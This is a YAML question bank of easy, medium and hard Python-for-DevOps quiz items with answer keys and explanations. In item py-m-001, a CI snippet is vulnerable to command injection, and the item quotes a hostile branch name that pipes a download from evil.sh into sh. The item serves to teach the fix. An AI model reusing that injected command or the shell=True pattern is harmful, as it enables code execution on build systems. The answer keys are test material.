# Python — the automation glue for DevOps: scripts, APIs, boto3, packaging.
level: easy
questions:

- id: py-e-001
  category: Python
  type: mcq
  question: "Which command creates an isolated environment for a project's dependencies?"
  options: ["python3 -m venv .venv", "pip freeze", "python3 -m pip install --global", "sudo pip install"]
  answer: 0
  explanation: "One venv per project keeps dependencies apart and avoids touching the OS Python, which modern distros refuse to let pip modify (PEP 668)."

- id: py-e-002
  category: Python
  type: mcq
  question: "Which runs a shell command from Python safely and fails loudly on a non-zero exit?"
  options: ["subprocess.run([\"kubectl\", \"get\", \"pods\"], check=True)", "os.system(\"kubectl get pods\")", "eval(\"kubectl get pods\")", "exec(\"kubectl get pods\")"]
  answer: 0
  explanation: "A list of arguments means no shell parsing (no injection), and `check=True` raises `CalledProcessError`. Add `capture_output=True, text=True` to read stdout."

- id: py-e-003
  category: Python
  type: mcq
  question: "Which is the AWS SDK for Python?"
  options: ["boto3", "awspy", "pyaws", "aws-cdk"]
  answer: 0
  explanation: "`boto3.client(\"s3\")` for the low-level API, `boto3.resource` for the object style. Credentials come from the standard chain: env vars, profiles, IRSA or Pod Identity, instance roles."

- id: py-e-004
  category: Python
  type: mcq
  question: "Which pattern guarantees a file is closed even if an exception is raised?"
  options: ["with open(\"app.log\") as f:", "f = open(\"app.log\") with no close", "open(\"app.log\").read() inside try only", "global f"]
  answer: 0
  explanation: "The `with` statement (a context manager) closes the file on exit. The same pattern covers locks, DB connections and temporary directories."

- id: py-e-005
  category: Python
  type: mcq
  question: "Which standard-library module parses command-line flags like `--env prod --dry-run`?"
  options: ["argparse", "sys.flags", "getenv", "click (stdlib)"]
  answer: 0
  explanation: "`argparse` is built in. Click and Typer are popular third-party alternatives. Either way, give every script `--help` and a `--dry-run`."

- id: py-e-006
  category: Python
  type: mcq
  question: "How do you read an environment variable with a default value?"
  options: ["os.environ.get(\"APP_ENV\", \"dev\")", "os.getenv[\"APP_ENV\"]", "env(\"APP_ENV\") or \"dev\" (builtin)", "sys.env.APP_ENV"]
  answer: 0
  explanation: "`os.environ[\"X\"]` raises a KeyError if X is missing, and `.get` returns the default. For required config, failing fast with a clear message is better than silently defaulting."

- id: py-e-007
  category: Python
  type: mcq
  question: "Which file pins exact dependency versions for a reproducible install?"
  options: ["requirements.txt with == pins (or a lock file like uv.lock/poetry.lock)", "setup.cfg comments", "README.md", ".python-version only"]
  answer: 0
  explanation: "`pip install -r requirements.txt` with exact pins (generated by `pip-compile`, `uv pip compile` or a lock file) means CI and prod install the same versions."

- id: py-e-008
  category: Python
  type: mcq
  question: "Which module turns a Python dict into JSON text?"
  options: ["json — json.dumps(obj)", "yaml — yaml.dumps(obj)", "pickle — pickle.text(obj)", "str(obj)"]
  answer: 0
  explanation: "`json.dumps` / `json.loads` handle strings, and `json.dump` / `json.load` handle files. `str(dict)` produces Python repr with single quotes — not valid JSON."

- id: py-e-009
  category: Python
  type: mcq
  question: "Which library is the de-facto choice for HTTP calls in scripts?"
  options: ["requests (or httpx)", "urllib3 only", "socket", "http.server"]
  answer: 0
  explanation: "`requests.get(url, timeout=5)` — always set a timeout, or a hung endpoint hangs your job forever. httpx adds async support and HTTP/2."

- id: py-e-010
  category: Python
  type: mcq
  question: "What does `if __name__ == \"__main__\":` do?"
  options: ["Runs the block only when the file is executed directly, not when imported", "Declares the main class", "Makes the script executable", "Enables multithreading"]
  answer: 0
  explanation: "It lets the same file be both an importable module (for tests) and a CLI script."

- id: py-e-011
  category: Python
  type: mcq
  question: "Which tool runs Python unit tests with plain `assert` statements?"
  options: ["pytest", "pylint", "black", "mypy"]
  answer: 0
  explanation: "pytest discovers `test_*.py` files. pylint and ruff lint, black formats, and mypy type-checks — all good CI steps."

- id: py-e-012
  category: Python
  type: mcq
  question: "Which is the safe way to load a YAML config file?"
  options: ["yaml.safe_load(f)", "yaml.load(f) without a Loader", "eval(f.read())", "exec(f.read())"]
  answer: 0
  explanation: "`yaml.load` with an unsafe Loader can build arbitrary Python objects (remote code execution if the file is attacker-controlled). `safe_load` only builds plain types."

- id: py-e-013
  category: Python
  type: mcq
  question: "Which logging call is better than `print()` for a long-running automation service?"
  options: ["logging.getLogger(__name__).info(\"synced %d records\", n)", "print(\"synced\", n, file=open(\"log\"))", "sys.stdout.write(n)", "os.system(\"echo synced\")"]
  answer: 0
  explanation: "`logging` gives levels, timestamps, handlers and lazy formatting. In containers, log to stdout (often as JSON) and let the platform ship it."

- id: py-e-014
  category: Python
  type: mcq
  question: "boto3 `list_objects_v2` returns at most 1,000 keys. How do you get all of them?"
  options: ["Use a paginator: s3.get_paginator(\"list_objects_v2\")", "Set MaxKeys=1000000", "Call it in a while True loop with the same arguments", "Use list_objects (v1)"]
  answer: 0
  explanation: "Paginators follow `ContinuationToken` for you. Forgetting pagination is the most common boto3 bug: the script 'works' in dev and silently misses data in prod."

- id: py-m-001
  level: medium
  category: Python
  type: mcq
  title: "Injected through a branch name"
  context:
    - kind: text
      title: ci_helper.py
      content: |
        branch = os.environ["BRANCH_NAME"]
        subprocess.run(f"git checkout {branch} && make deploy", shell=True, check=True)
  question: "A PR named `x; curl evil.sh | sh` gets this executed. What's the fix?"
  options:
    - "Pass a list without a shell: `subprocess.run([\"git\", \"checkout\", branch], check=True)`, then run `make` separately"
    - "Wrap `branch` in double quotes inside the f-string"
    - "Use `os.system` instead"
    - "Strip semicolons only"
  answer: 0
  explanation: "`shell=True` with interpolated input is command injection. Use an argument list, and validate branch names (`git check-ref-format`). If you truly need a shell, `shlex.quote()` every value."

- id: py-m-002
  level: medium
  category: Python
  type: mcq
  title: "Throttled by AWS"
  context:
    - kind: log
      title: traceback
      content: |
        botocore.exceptions.ClientError: An error occurred (ThrottlingException) when calling the DescribeInstances operation (reached max retries: 4): Rate exceeded
  question: "Your inventory script calls `describe_instances` across 30 accounts in a tight loop. Best fix?"
  options:
    - "Configure retries (`Config(retries={\"mode\": \"adaptive\", \"max_attempts\": 10})`), use paginators/filters, and limit concurrency"
    - "Catch the exception and ignore it"
    - "Add `time.sleep(0)`"
    - "Switch regions"
  answer: 0
  explanation: "botocore has built-in retry modes: standard, and adaptive (client-side rate limiting). Fetching less — filters, paginators, AWS Config aggregator or Resource Explorer — beats hammering APIs."

- id: py-m-003
  level: medium
  category: Python
  type: mcq
  title: "Works locally, ImportError in the container"
  context:
    - kind: dockerfile
      title: Dockerfile
      content: |
        FROM python:3.12-slim
        WORKDIR /app
        COPY app/ .
        RUN pip install flask
        CMD ["python", "main.py"]
  question: "The app also needs `boto3` and `pydantic`, which are installed on the developer's laptop. What's the real fix?"
  options:
    - "Install from a pinned requirements/lock file in the image (`COPY requirements.txt .` → `pip install --no-cache-dir -r requirements.txt`)"
    - "Add each missing package to the RUN line as errors appear"
    - "Copy the laptop's site-packages into the image"
    - "Use `python:latest`"
  answer: 0
  explanation: "The image must be built from declared dependencies, not from whatever happens to be on someone's machine. Copy the requirements before the code so the dependency layer stays cached."

- id: py-m-004
  level: medium
  category: Python
  type: mcq
  title: "Mutable default argument"
  context:
    - kind: text
      title: tags.py
      content: |
        def add_tag(tag, tags=[]):
            tags.append(tag)
            return tags

        add_tag("team:payments")   # ['team:payments']
        add_tag("env:prod")        # ['team:payments', 'env:prod']  ???
  question: "Why does the second call keep the first tag?"
  options:
    - "Default values are evaluated once at definition time — use `tags=None` and create a new list inside"
    - "Lists are immutable"
    - "`append` is asynchronous"
    - "Python caches return values"
  answer: 0
  explanation: "A classic bug that corrupts tag sets and payloads in long-running workers. Write `def add_tag(tag, tags=None): tags = [] if tags is None else tags`."

- id: py-m-005
  level: medium
  category: Python
  type: multi
  title: "Production-ready automation script"
  question: "Which practices make an ops script safe to run in CI against prod? (select all)"
  options:
    - "`--dry-run` default or flag, and explicit confirmation for destructive actions"
    - "Timeouts and retries with backoff on every network call"
    - "Exit with a non-zero code on failure so the pipeline stops"
    - "Catch `Exception` and `pass` so the job always goes green"
  answer: [0, 1, 2]
  explanation: "A green job that silently failed is worse than a red one. Fail loudly, retry what's retryable, and make destructive paths opt-in."

- id: py-m-006
  level: medium
  category: Python
  type: mcq
  title: "Kubernetes from Python"
  scenario: "An in-cluster CronJob in Python must list Pods in its own namespace."
  question: "How should it authenticate?"
  options:
    - "`kubernetes.config.load_incluster_config()` with a ServiceAccount bound to a namespaced Role allowing `list pods`"
    - "Bake a kubeconfig with cluster-admin into the image"
    - "Call the API server anonymously"
    - "Mount the node's /etc/kubernetes"
  answer: 0
  explanation: "In-cluster config reads the projected ServiceAccount token and CA. Least-privilege RBAC keeps a bug from turning into a cluster-wide incident."

- id: py-m-007
  level: medium
  category: Python
  type: mcq
  title: "Slow sequential health checks"
  scenario: "A script checks 300 internal HTTPS endpoints one by one with `requests` and takes 12 minutes. The work is I/O-bound."
  question: "What gives the biggest speed-up with minimal change?"
  options:
    - "`concurrent.futures.ThreadPoolExecutor(max_workers=32)` (or asyncio + httpx) with a per-request timeout"
    - "Use multiprocessing with 300 processes"
    - "Rewrite in Bash"
    - "Increase the timeout"
  answer: 0
  explanation: "Threads are fine for network waits despite the GIL. Bound the concurrency so you don't DoS your own services, and always set timeouts."

- id: py-m-008
  level: medium
  category: Python
  type: mcq
  title: "Datetime surprise"
  scenario: "A cleanup job deletes snapshots older than 7 days using `datetime.now() - snap['StartTime']` and crashes: `can't subtract offset-naive and offset-aware datetimes`."
  question: "What's the right fix?"
  options:
    - "Use timezone-aware now: `datetime.now(timezone.utc)`"
    - "Strip timezone info from AWS timestamps with `.replace(tzinfo=None)` everywhere"
    - "Convert both to strings and compare"
    - "Use `time.sleep`"
  answer: 0
  explanation: "boto3 returns timezone-aware UTC datetimes. Keep everything aware and in UTC — mixing naive and aware datetimes is a bug factory, especially with Dubai (UTC+4) laptops and UTC servers."

- id: py-m-009
  level: medium
  category: Python
  type: mcq
  title: "Secrets in a Lambda"
  scenario: "A Python Lambda reads a DB password from Secrets Manager on every invocation, adding 80 ms and API costs."
  question: "Best improvement?"
  options:
    - "Fetch once at init (outside the handler) and cache with a TTL — or use the AWS Parameters and Secrets Lambda Extension"
    - "Hard-code the password"
    - "Store it in an env var in plaintext"
    - "Call Secrets Manager twice to be safe"
  answer: 0
  explanation: "Code outside the handler runs once per execution environment. A TTL cache still picks up rotations, and the extension provides a local cached HTTP endpoint."

- id: py-m-010
  level: medium
  category: Python
  type: mcq
  title: "Type hints in CI"
  question: "What does running `mypy` (or pyright) in CI buy an ops team?"
  options:
    - "Catches wrong-type bugs (None where a str is expected, wrong boto3 shapes) before runtime"
    - "Makes Python compile to machine code"
    - "Formats the code"
    - "Encrypts the script"
  answer: 0
  explanation: "Most production Python failures in automation are `NoneType has no attribute ...`. Type checking with `boto3-stubs` catches many of them in the PR."

- id: py-m-011
  level: medium
  category: Python
  type: mcq
  title: "Which package manager?"
  scenario: "Your team wants faster CI installs and a lock file without changing much."
  question: "Which tool fits that brief well in 2026?"
  options: ["uv (pip-compatible, lock files, very fast)", "easy_install", "conda for every web service", "Copying wheels by hand"]
  answer: 0
  explanation: "uv is a drop-in for pip and venv workflows (`uv pip install -r`, `uv sync` with `uv.lock`) and is dramatically faster. Poetry and pip-tools are also fine; pick one and commit the lock."

- id: py-h-001
  level: hard
  category: Python
  type: spot
  title: "The script that never times out"
  scenario: "This health checker hung for 6 hours in CI last night. Which line causes it?"
  lang: bash
  code: |
    import requests, sys

    def check(url):
        r = requests.get(url)
        return r.status_code == 200

    if __name__ == "__main__":
        bad = [u for u in sys.argv[1:] if not check(u)]
        sys.exit(1 if bad else 0)
  answer: [4]
  explanation: "`requests` has no default timeout, so a server that accepts the connection but never answers hangs forever. Use `requests.get(url, timeout=(3, 10))`, and set `timeout-minutes` on the CI job as a backstop."

- id: py-h-002
  level: hard
  category: Python
  type: fill
  title: "Paginate S3 with boto3"
  scenario: "Count every object under `logs/` in bucket `acme-audit`, however many there are."
  lang: bash
  template: |
    import boto3
    s3 = boto3.client("s3")
    pages = s3.{{fn}}("list_objects_v2").paginate(Bucket="acme-audit", {{arg}}="logs/")
    total = sum(len(p.get("Contents", [])) for p in pages)
    print(total)
  blanks:
    fn:  { accept: ["^get_paginator$"], solution: get_paginator, width: 14 }
    arg: { accept: ["^Prefix$"], solution: Prefix, width: 7 }
  explanation: "`get_paginator` handles `ContinuationToken` for you, and `Prefix` narrows the listing. `p.get(\"Contents\", [])` guards against empty pages, which have no Contents key."

- id: py-h-003
  level: hard
  category: Python
  type: order
  title: "Ship an internal CLI"
  question: "Order the steps to publish an internal Python CLI that other teams install safely."
  items:
    - "Define the package in `pyproject.toml` with a console-script entry point"
    - "Lock and pin dependencies (uv.lock / requirements with hashes)"
    - "Run ruff, mypy and pytest in CI"
    - "Build a wheel and publish to the internal index (CodeArtifact/Artifactory) with provenance"
    - "Users install with `pipx install acme-cli` (isolated venv per tool)"
  explanation: "Declare it, lock it, test it, publish it, and install it isolated. `pipx` (or `uv tool install`) keeps each CLI in its own venv so tools don't break each other."

- id: py-e-015
  category: Python
  type: mcq
  question: "Which standard-library module walks and manipulates file paths in a cross-platform way?"
  options: ["pathlib — Path(\"logs\") / \"app.log\"", "os.system", "glob only", "shutil.path"]
  answer: 0
  explanation: "`pathlib.Path` handles `/` vs `\\` and gives `.glob()`, `.read_text()`, `.exists()` and more. Scripts that run on both Linux CI and Windows agents benefit most."
